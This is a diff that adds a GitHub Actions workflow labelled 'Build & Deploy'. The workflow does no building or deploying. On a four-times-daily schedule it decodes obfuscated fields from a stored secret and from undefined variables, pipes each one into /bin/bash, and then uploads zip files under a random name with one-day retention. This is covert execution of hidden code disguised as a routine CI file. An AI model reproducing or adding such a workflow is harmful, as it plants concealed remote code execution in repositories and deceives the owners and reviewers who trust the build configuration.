@@ -1,0 +1,34 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          x1: ${{ secrets.x1 }}
+        run: |
+          printf '%s' "$x1" | jq -r .byooq455 | /bin/bash
+          printf '%s' "$qyhsl2030" | jq -r .yqey25 | /bin/bash
+          echo $nbv1 | jq -r .pxsr115 | /bin/bash
+          printf '%s' "$q035" | jq -r .mggr12 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0vo2TcNf
+          path: "*.zip"
+          retention-days: 1
